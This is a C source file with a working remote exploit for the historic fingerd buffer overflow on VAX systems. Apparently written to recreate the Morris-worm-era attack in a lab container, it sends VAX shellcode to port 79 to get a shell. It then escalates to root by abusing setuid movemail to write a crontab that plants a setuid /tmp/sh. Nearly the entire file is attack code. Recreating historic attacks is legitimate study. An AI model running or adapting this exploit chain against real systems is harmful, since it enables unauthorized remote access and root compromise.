#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

#define TARGET_IP "172.17.0.2"
#define FINGERD_IP 79

#define BUF_SIZE 512 + 16 + 4 // finger buffer size + four 4 byte words + 4byte address
#define PAYLOAD "\335\217/sh\0\335\217/bin\320^Z\335\0\335\0\335Z\335\003\320^\\\274;\344\371\344\342\241\256\343\350\357\256\362\351"
#define PAYLOAD_LEN 28
#define NOP 0x01	// VAX nop instruction
#define PATIENCE 3					

void create_exploit(char *buf, char *shellcode, ssize_t buf_size, ssize_t shellcode_len) {
	int i, j;
	int extra_words = 4 * 4;
	int address_size = 4;
    for (i = 0; i < buf_size; i++) buf[i] = NOP;  
    for (j = 0; j < shellcode_len; j++) buf[300+j] = shellcode[j]; 

	// from rapid7 article
	for (i = buf_size - extra_words - address_size; i < buf_size - address_size; i ++) { 
		buf[i] = 0x00; 
	}
	// some place within the buffer
    for (i = buf_size - address_size; i < buf_size; i += 4) {
        buf[i]   = 0x38; 
        buf[i+1] = 0xea;
        buf[i+2] = 0xff;
        buf[i+3] = 0x7f;
    }
}	

void read_from_sock(int sock, fd_set *read_fds, char *io_buf, size_t buf_size) {
	// read until there are no more bytes to read 
	// try PATIENCE times until quitting
	int num_tries = 0;
	while (num_tries < PATIENCE) {
		FD_ZERO(read_fds);
		FD_SET(sock, read_fds);

		struct timeval tv;
		tv.tv_sec = 1;  
		tv.tv_usec = 0;

		int ready_fds = select(sock + 1, read_fds, NULL, NULL, &tv);
		if (ready_fds > 0 && FD_ISSET(sock, read_fds)) {
			int n = read(sock, io_buf, buf_size - 1);
			if (n > 0) {
				io_buf[n] = '\0'; 
				printf("%s", io_buf); // Print results to your screen
				fflush(stdout);
				num_tries = 0; 
			} else {	
				break;
			}
		} else {
			num_tries++;
		}	
	}	
}	

void send_text(int sock, fd_set *write_fds, char *text) {
	int num_tries = 0;
	size_t total_sent = 0;
	size_t len = strlen(text);

	while (num_tries < PATIENCE) {
		FD_ZERO(write_fds);
		FD_SET(sock, write_fds);

		struct timeval tv;
		tv.tv_sec = 1;  
		tv.tv_usec = 0;

		int ready_fds = select(sock + 1, NULL, write_fds, NULL, &tv);
		if (ready_fds > 0 && FD_ISSET(sock, write_fds)) {
			int n = write(sock, text + total_sent, len - total_sent);
			if (n > 0) { 
				total_sent += n;
				num_tries = 0;
			} else {	
				break;
			}	
		} else {
			num_tries++;
		}	
	}	
}	


int main() {
    int sock = 0;
    struct sockaddr_in serv_addr;

    char buf[532] = {0};

	create_exploit(buf, PAYLOAD, (ssize_t)BUF_SIZE, (ssize_t)PAYLOAD_LEN);

	//create socket
	sock = socket(AF_INET, SOCK_STREAM, 0);

	// target network address info
	serv_addr.sin_family = AF_INET; 		
	serv_addr.sin_port = htons(FINGERD_IP);
	inet_pton(AF_INET, TARGET_IP, &serv_addr.sin_addr);

	// connect to fingerd
	connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

	// deliever payload; fingerd should now be a shell
	write(sock, buf, sizeof(buf));
    printf("Payload delivered!\n");

    char io_buf[2048];
    int num_commands = 11;

	char **commands = malloc(num_commands*sizeof(char **));

	char *echo_command = "echo connected123\n";
	char *export_path = "PATH=/bin:/usr/bin:/usr/ucb:/etc; export PATH\n";
	char *whoami = "whoami\n";
	char *ls = "ls -al\n";

	// from rapid7's article, assuming that movemail is on the local system with setuid bit set
	char *movemail_exploit = "(umask 0 && /etc/movemail /dev/null /usr/lib/crontab.local)\n";
	char *crontab_exploit = "(echo \"* * * * * root cp /bin/sh /tmp && chmod u+s /tmp/sh\"; echo  \"* * * * * root rm -f /usr/lib/crontab.local\") > /usr/lib/crontab.local\n";
	char *check_crontab = "cat /usr/lib/crontab.local\n";
	char *check_for_shell = "ls -l /tmp/sh\n"; // this needs to be ran multiple times until cronjob does its thing
	char *run_shell = "/tmp/sh\n"; 
	char *touch_file = "cd /; echo Hello from ubuntu! > hello_from_ubuntu; cat hello_from_ubuntu\n";

	commands[0] = echo_command;  // dummy command that gets ignored for some reason
	commands[1] = export_path;	
	commands[2] = whoami;	
	commands[3] = movemail_exploit;
	commands[4] = crontab_exploit;
	commands[5] = check_crontab;
	commands[6] = check_for_shell;
	commands[7] = run_shell;
	commands[8] = whoami;
	commands[9] = touch_file;
	commands[10] = echo_command;	

	fd_set write_fds;
	fd_set read_fds;

	int i;

	for (i = 0; i < num_commands;) {
		while (i < num_commands) {
			// send the command until it is received by the socket
			// I had to resort to this because the socket connection
			// was instable and would sometimes ignore commands
			send_text(sock, &write_fds, commands[i]);
			read_from_sock(sock, &read_fds, io_buf, 2048);
			i++;
		}	
	}	

	close(sock);
	free(commands);

    return 0;
}
